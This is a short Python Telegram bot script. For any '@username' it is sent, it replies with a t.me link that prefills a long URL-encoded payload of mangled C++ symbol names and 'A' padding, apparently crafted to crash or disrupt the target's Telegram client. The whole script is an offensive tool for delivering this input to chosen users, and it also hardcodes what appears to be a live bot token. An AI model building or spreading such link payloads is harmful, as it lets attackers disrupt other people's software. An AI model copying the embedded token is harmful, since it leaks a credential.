import telebot

TOKEN = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
PAYLOAD = '%40%3F1%3F%3Fdownload_single_file_task%40DownloadManager%40%40AEAXAXAEBV%3F%24shared_ptr%40DownloadTask%40%40%402%40AEAVWaitGroup%40marl%40%40AEAV%3F%24shared_ptr%40std%40%40%402%40%40Z%40AEBVClientFile%40%40AEAH%40std%40%40......%5D%40......%3FAV%3Clambda_2%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40.........5D%40......%3FAV%3Clambda_3%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40......%5D%40......%3FAV%3Clambda_1%3E%40%3F5%3F%3F%3FR0%3F1%3F%3Fentry%40%40YAXXZ%40QEB%40XZ%40...%5D%40......%3FAVout_of_range%40detail%40json_abi_v3_11_3%40nlohmann%40%40......ager%40%40AEAXXAEBV%3F%24sha2%40%40Z%40AEBV62%40AEBV78%40%40std%40%40...%5D%40......%3FAV%3Clambda_3%3E%40%3F1%3F%3F%3FWebView2%40%40QEA%40PEAVLoader%40%40%40Z%40......%5D%40......%3FAV%3Clambda_1%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40......%5D%40......%3FA%40QEBXXZ%40......%5D%40......%3FAV%3Clambda_4%3E%40%3F1%3F%3F%3FWebView2%40%40QEA%40PEAVLoader%40%40%40Z%40......%5D%40......AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3F'

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(func=lambda m: True)
def handle(msg):
    t = msg.text
    if t and t.startswith('@'):
        u = t.split()[0].lstrip('@')
        bot.reply_to(msg, f'https://t.me/{u}?text={PAYLOAD}')
    else:
        bot.reply_to(msg, 'Отправь @username')

bot.polling(none_stop=True)
